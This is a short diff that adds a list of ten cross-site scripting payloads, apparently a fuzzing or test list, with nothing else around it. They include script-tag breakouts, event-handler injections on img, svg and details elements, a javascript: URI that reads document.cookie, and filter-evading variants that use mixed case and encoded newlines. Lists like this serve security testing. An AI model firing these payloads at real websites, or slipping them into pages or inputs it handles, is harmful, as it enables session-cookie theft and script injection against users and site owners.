@@ -1,0 +1,10 @@
+</script><script>alert(123)</script>
+%<H1 onmouseover=alert("yo")>Hillo</H1>
+straw"><img src=a onerror=alert(1)>hat
+'-confirm(1234)-'
+javascript:alert(document.cookie)
+"><svg/onload=confirm(1)>"@x.y
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+</script><dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+"><img src="/" =_=" title="onerror​='prompt(document.cookie)'">.png
+"><a/></td></tr></table></script><script>prompt();</script></html>//
